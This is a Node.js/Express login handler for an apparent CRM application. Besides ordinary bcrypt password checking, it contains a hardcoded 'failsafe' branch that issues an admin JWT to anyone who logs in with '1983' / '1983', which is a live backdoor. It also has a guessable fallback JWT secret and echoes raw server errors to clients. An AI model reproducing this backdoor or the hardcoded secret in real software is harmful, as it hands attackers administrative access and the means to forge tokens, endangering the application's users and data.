const db = require('../config/db');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

exports.login = async (req, res) => {
  const { email, password } = req.body;
  const JWT_SECRET = process.env.JWT_SECRET || 'taxta_crm_secret_key_2024';

  try {
    const { rows } = await db.query('SELECT * FROM users WHERE email = $1', [email]);
    const user = rows[0];

    // Failsafe login for 1983
    if (email === '1983' && password === '1983') {
      const token = jwt.sign({ id: 0, email: '1983' }, JWT_SECRET, { expiresIn: '24h' });
      return res.json({ token, user: { id: 0, email: '1983', name: 'Admin' } });
    }

    if (!user || !bcrypt.compareSync(password, user.password)) {
      return res.status(401).json({ error: "Email yoki parol noto'g'ri" });
    }

    const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token, user: { id: user.id, email: user.email } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};
